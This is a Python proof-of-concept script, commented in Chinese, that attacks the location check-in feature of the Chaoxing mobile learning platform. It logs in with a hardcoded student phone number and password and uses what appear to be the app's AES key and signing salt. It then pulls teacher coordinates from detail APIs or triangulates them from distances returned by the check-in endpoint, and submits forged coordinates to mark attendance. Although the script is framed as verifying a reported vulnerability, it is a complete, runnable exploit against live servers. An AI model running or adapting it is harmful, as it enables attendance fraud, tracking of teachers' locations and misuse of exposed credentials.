#!/usr/bin/env python3
"""
位置签到漏洞实测POC - 使用学生账号18436633997
漏洞链: stuSignajax距离信息泄露 → 三角定位反推教师位置 → 伪造坐标完成位置签到
对应报告: 漏洞5 位置签到距离信息泄露 + 位置伪造 (MEDIUM 5.3)
"""
import base64, hashlib, json, uuid, requests, urllib3, time, re, math, sys
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from datetime import datetime

urllib3.disable_warnings()

AES_KEY = b"u2oh6Vu^HWe4_AES"
SCHILD_SALT = "ipL$TkeiEmfy1gTXb2XHrdLN0a@7c^vu"
LOGIN_URL = "https://passport2.chaoxing.com/fanyalogin"
BASE = "https://mobilelearn.chaoxing.com"

# 两个测试课程
COURSES = [
    ("257485372", "132821141", "课程111"),
    ("262934472", "145110605", "好好学习，天天向上"),
]

STUDENT_PHONE = "18436633997"
STUDENT_PWD = "3.1415926Cpy"


def aes_enc(p):
    c = AES.new(AES_KEY, AES.MODE_CBC, AES_KEY)
    return base64.b64encode(c.encrypt(pad(p.encode(), AES.block_size))).decode()


def schild_sign(model, locale, version, build, imei):
    parts = [f"(schild:{SCHILD_SALT})", f"(device:{model})", f"Language/{locale}",
             f"com.chaoxing.mobile/ChaoXingStudy_3_{version}_android_phone_{build}",
             f"(@Kalimdor)_{imei}"]
    return hashlib.md5(" ".join(parts).encode()).hexdigest()


def get_mobile_ua():
    imei = uuid.uuid4().hex[:32]
    sc = schild_sign("MI10", "zh_CN", "6.7.2", "10941_314", imei)
    return (f"Mozilla/5.0 (Linux; Android 16; MI10 Build/OPM1.171019.019; wv) "
            f"AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/71.0.3578.99 Mobile Safari/537.36 "
            f"(schild:{sc}) (device:MI10) Language/zh_CN "
            f"com.chaoxing.mobile/ChaoXingStudy_3_6.7.2_android_phone_10941_314 "
            f"(@Kalimdor)_{imei}")


def login(phone, pwd):
    s = requests.Session()
    s.verify = False
    ua = get_mobile_ua()
    s.headers.update({"User-Agent": ua, "Accept": "application/json, text/plain, */*", "Accept-Language": "zh_CN"})
    s.post(LOGIN_URL, data={"fid": "-1", "uname": aes_enc(phone), "password": aes_enc(pwd),
                            "refer": "http%3A%2F%2Fi.mooc.chaoxing.com", "t": "true",
                            "forbidotherlogin": "0", "validate": "", "doubleFactorLogin": "0",
                            "independentId": "0", "independentNameId": "0"},
           allow_redirects=False, timeout=30)
    puid = ""
    for c in s.cookies:
        if c.name in ("UID", "_uid"):
            puid = c.value
    try: s.get("https://i.chaoxing.com/base", timeout=20, allow_redirects=True)
    except: pass
    return s, puid


def safe_json(r):
    try: return r.json()
    except: return {"_raw_status": r.status_code, "_raw_text": r.text[:500]}


AJAX_HDR = {"Referer": "https://mobilelearn.chaoxing.com/", "X-Requested-With": "XMLHttpRequest",
            "Content-Type": "application/x-www-form-urlencoded"}

print("=" * 80)
print("位置签到漏洞实测POC（学生账号视角）")
print(f"时间: {datetime.now():%Y-%m-%d %H:%M:%S}")
print("漏洞链: 距离信息泄露 → 三角定位 → 位置伪造签到")
print("=" * 80)

# ============ Phase 1: 登录 ============
print("\n[Phase 1] 登录学生账号...")
s_s, puid_s = login(STUDENT_PHONE, STUDENT_PWD)
if not puid_s:
    print("登录失败！"); sys.exit(1)
print(f"  学生登录成功 puid={puid_s}")

# ============ Phase 2: 查找进行中的位置签到活动 ============
print("\n[Phase 2] 扫描两个课程的活动列表，查找位置签到...")
location_aids = []
for course_id, class_id, cname in COURSES:
    try:
        r = s_s.get(f"{BASE}/ppt/activeAPI/taskactivelist",
                    params={"courseId": course_id, "classId": class_id, "uid": puid_s}, timeout=20)
        d = safe_json(r)
        items = d.get("activeList", []) if isinstance(d, dict) else []
        print(f"\n  课程[{cname}] courseId={course_id}: {len(items)}个活动")
        for item in items[:10]:
            aid = str(item.get("id", ""))
            atype = str(item.get("activeType", ""))
            status = str(item.get("status", ""))
            name = item.get("nameOne", "")
            # activeType恒为2不可靠，按nameOne识别
            tag = "→位置签到" if "位置" in name else ""
            print(f"    aid={aid} type={atype} status={status} name={name[:30]} {tag}")
            if "位置" in name:
                location_aids.append({"aid": aid, "course": cname, "courseId": course_id,
                                      "classId": class_id, "name": name, "status": status})
    except Exception as e:
        print(f"  课程[{cname}] 获取失败: {e}")

if not location_aids:
    print("\n未找到位置签到活动！请确认已在课程中发起位置签到。")
    sys.exit(1)

# 优先选进行中(status=1)的位置签到，否则选最新的
in_progress = [a for a in location_aids if a["status"] == "1"]
target = in_progress[0] if in_progress else location_aids[0]
aid = target["aid"]
print(f"\n  选定目标: aid={aid} 课程={target['course']} name={target['name']}")

# ============ Phase 3: 获取活动详情（检查位置信息泄露） ============
print("\n[Phase 3] 获取活动详情，检查教师位置坐标是否泄露...")
detail_apis = [
    ("GET", f"{BASE}/v2/apis/active/getActiveDetail", {"activeId": aid, "uid": puid_s}),
    ("GET", f"{BASE}/v2/apis/active/detail", {"activeId": aid, "uid": puid_s}),
    ("GET", f"{BASE}/ppt/activeAPI/getActiveDetail", {"activeId": aid, "courseId": target["courseId"]}),
]
leaked_pos = None
for method, url, params in detail_apis:
    try:
        r = s_s.get(url, params=params, timeout=15) if method == "GET" else s_s.post(url, data=params, timeout=15)
        text = r.text
        path = url.split("chaoxing.com")[1].split("?")[0]
        # 查找经纬度字段
        lat_m = re.search(r'"?(?:latitude|lat)"?\s*[:=]\s*"?(-?\d+\.\d+)', text)
        lng_m = re.search(r'"?(?:longitude|lng|lon)"?\s*[:=]\s*"?(-?\d+\.\d+)', text)
        if lat_m and lng_m:
            lat, lng = float(lat_m.group(1)), float(lng_m.group(1))
            if 3 < lat < 54 and 73 < lng < 136:  # 中国范围内有效坐标
                print(f"  [泄露] {path}: latitude={lat}, longitude={lng}")
                if leaked_pos is None:
                    leaked_pos = (lat, lng)
        else:
            print(f"  {path}: HTTP {r.status_code}, 无坐标字段 ({text[:80]})")
    except Exception as e:
        print(f"  异常: {e}")

if leaked_pos:
    print(f"\n  *** 活动详情直接泄露教师签到位置: {leaked_pos} — 无需三角定位 ***")

# ============ Phase 4: 检查当前签到状态 ============
print("\n[Phase 4] 检查学生当前签到状态...")
r = s_s.get(f"{BASE}/v2/apis/sign/signIn",
            params={"activeId": aid, "uid": puid_s, "latitude": "-1", "longitude": "-1"}, timeout=20)
d = safe_json(r)
cur_status = None
if isinstance(d, dict) and isinstance(d.get("data"), dict):
    cur_status = d["data"].get("status")
    print(f"  当前状态: status={cur_status} (1=已签到, 0/null=未签到)")
    other = {k: v for k, v in d["data"].items() if k not in ("id",)}
    print(f"  记录字段: {json.dumps(other, ensure_ascii=False)[:300]}")

if cur_status == 1:
    print("\n  学生已签到（可能是之前测试的记录）。仍继续验证距离泄露漏洞。")


# ============ Phase 5: 位置签到探测（距离信息泄露验证） ============
def try_sign(lat, lng, address="中国"):
    """尝试位置签到，返回 (distance, success, raw_text)
    distance: 0=签到成功, >0=距离米数, -1=无法解析, -2=已签到, -3=已结束"""
    r = s_s.post(f"{BASE}/pptSign/stuSignajax",
                 data={"activeId": aid, "uid": puid_s, "clientip": "",
                       "latitude": str(lat), "longitude": str(lng),
                       "appType": "15", "fid": "0", "address": address},
                 headers=AJAX_HDR, timeout=15)
    text = r.text
    if "成功" in text:
        return 0, True, text
    if "已签到" in text or "已经签到" in text:
        return -2, False, text
    if "结束" in text:
        return -3, False, text
    m = re.search(r'(\d+\.?\d*)\s*米', text)
    if m:
        return float(m.group(1)), False, text
    return -1, False, text


print("\n[Phase 5] 验证距离信息泄露 — 用远离的坐标试探...")
# 起始探测点：郑州（之前教师位置附近）+ 北京（远离点）
probes = [
    ("郑州", 34.79, 113.67),
    ("北京", 39.90, 116.40),
    ("上海", 31.23, 121.47),
]
measurements = []
for pname, lat, lng in probes:
    dist, success, text = try_sign(lat, lng)
    print(f"  {pname}({lat},{lng}): dist={dist}m, resp={text[:80]}")
    if success:
        print(f"\n  *** 签到直接成功！位置签到伪造漏洞确认（无需定位）***")
        break
    if dist == -2:
        print("  已签到，停止探测"); break
    if dist == -3:
        print("  签到已结束"); sys.exit(0)
    if dist > 0:
        measurements.append((lat, lng, dist))
    time.sleep(0.5)

# ============ Phase 6: 三角定位反推教师位置 ============
best_pos = leaked_pos
if not best_pos and len(measurements) >= 3:
    print(f"\n[Phase 6] 三角定位法反推教师位置（{len(measurements)}个测距点）...")

    def haversine(lat1, lon1, lat2, lon2):
        R = 6371000
        phi1, phi2 = math.radians(lat1), math.radians(lat2)
        dphi = math.radians(lat2 - lat1)
        dlambda = math.radians(lon2 - lon1)
        a = math.sin(dphi / 2) ** 2 + math.cos(phi1) * math.cos(phi2) * math.sin(dlambda / 2) ** 2
        return 2 * R * math.asin(math.sqrt(a))

    # 以距离最小的测点为中心网格搜索
    c_lat = min(measurements, key=lambda m: m[2])[0]
    c_lng = min(measurements, key=lambda m: m[2])[1]
    max_d = max(m[2] for m in measurements)

    best_err, best_lat, best_lng = float('inf'), c_lat, c_lng
    # 粗搜（约max_d公里范围）
    rng = max(0.05, max_d / 111000.0 + 0.05)
    step = 0.002
    for la in [c_lat - rng + i * step for i in range(int(2 * rng / step) + 1)]:
        for lo in [c_lng - rng + i * step for i in range(int(2 * rng / step) + 1)]:
            err = sum((haversine(m[0], m[1], la, lo) - m[2]) ** 2 for m in measurements)
            if err < best_err:
                best_err, best_lat, best_lng = err, la, lo
    # 精搜
    step2 = 0.0002
    for la in [best_lat - 0.002 + i * step2 for i in range(21)]:
        for lo in [best_lng - 0.002 + i * step2 for i in range(21)]:
            err = sum((haversine(m[0], m[1], la, lo) - m[2]) ** 2 for m in measurements)
            if err < best_err:
                best_err, best_lat, best_lng = err, la, lo
    best_pos = (best_lat, best_lng)
    print(f"  三角定位结果: ({best_lat:.6f}, {best_lng:.6f}), RMS误差={math.sqrt(best_err/len(measurements)):.0f}m")
elif not best_pos:
    print("\n[Phase 6] 测距点不足或泄露坐标缺失，改用单点梯度逼近...")

# ============ Phase 7: 梯度逼近 + 伪造坐标签到 ============
print(f"\n[Phase 7] 使用伪造坐标完成位置签到...")
success_pos = None

if best_pos:
    # 用定位结果直接签到
    dist, success, text = try_sign(best_pos[0], best_pos[1])
    print(f"  定位点({best_pos[0]:.6f},{best_pos[1]:.6f}): dist={dist}m, resp={text[:100]}")
    if success:
        success_pos = best_pos

if not success_pos:
    # 梯度下降逼近
    print("  进入梯度逼近模式...")
    if not best_pos:
        best_pos = (34.79, 113.67)
        d0, _, _ = try_sign(best_pos[0], best_pos[1])
        if d0 <= 0 and d0 != -1:
            best_dist = 1e9
        else:
            best_dist = d0 if d0 > 0 else 1e9
    else:
        d0, _, _ = try_sign(best_pos[0], best_pos[1])
        best_dist = d0 if d0 > 0 else 1e9

    cur_lat, cur_lng = best_pos
    for it in range(10):
        step = 0.01 / (2 ** it)
        improved = False
        for dlat, dlng in [(-step, 0), (step, 0), (0, -step), (0, step),
                           (-step, -step), (-step, step), (step, -step), (step, step)]:
            t_lat, t_lng = cur_lat + dlat, cur_lng + dlng
            dist, success, text = try_sign(t_lat, t_lng)
            if success:
                success_pos = (t_lat, t_lng)
                print(f"  *** 签到成功! 坐标=({t_lat:.6f},{t_lng:.6f}) ***")
                break
            if dist == -2:
                break
            if 0 < dist < best_dist:
                best_dist = dist
                cur_lat, cur_lng = t_lat, t_lng
                improved = True
            time.sleep(0.3)
        if success_pos or best_dist >= 1e9:
            break
        print(f"  迭代{it+1}: 位置=({cur_lat:.6f},{cur_lng:.6f}), 距离={best_dist:.0f}m")
        if best_dist < 50:
            dist, success, text = try_sign(cur_lat, cur_lng)
            if success:
                success_pos = (cur_lat, cur_lng)
                break

# ============ Phase 8: 最终验证 ============
print("\n[Phase 8] 最终签到状态验证...")
time.sleep(2)
r = s_s.get(f"{BASE}/v2/apis/sign/signIn",
            params={"activeId": aid, "uid": puid_s, "latitude": "-1", "longitude": "-1"}, timeout=20)
d = safe_json(r)
final_status = None
final_data = {}
if isinstance(d, dict) and isinstance(d.get("data"), dict):
    final_status = d["data"].get("status")
    final_data = d["data"]
    print(f"  最终状态: status={final_status}")

print("\n" + "=" * 80)
print("实测结论")
print("=" * 80)
print(f"""
目标活动: aid={aid} ({target['course']}) {target['name']}
活动详情泄露教师位置: {'是 - ' + str(leaked_pos) if leaked_pos else '否'}
三角定位反推位置: {best_pos if best_pos and not leaked_pos else '未使用'}
测距样本: {measurements}
最终签到状态: {final_status} {'(已签到)' if final_status == 1 else '(未签到)'}
签到成功坐标: {success_pos}
""")
if final_status == 1:
    print("  [漏洞确认] 位置签到伪造成功！漏洞链完整可用：")
    if leaked_pos:
        print("   1. 活动详情接口泄露教师签到位置坐标")
    if measurements:
        print(f"   {'2' if leaked_pos else '1'}. stuSignajax返回精确距离，可三角定位教师位置")
    print(f"   {'3' if leaked_pos else '2'}. 学生提交伪造经纬度即通过位置签到（无GPS来源校验）")
else:
    print("  签到未成功 — 检查活动是否已结束或距离范围限制")
print(f"\n完整签到记录: {json.dumps(final_data, ensure_ascii=False)[:500]}")
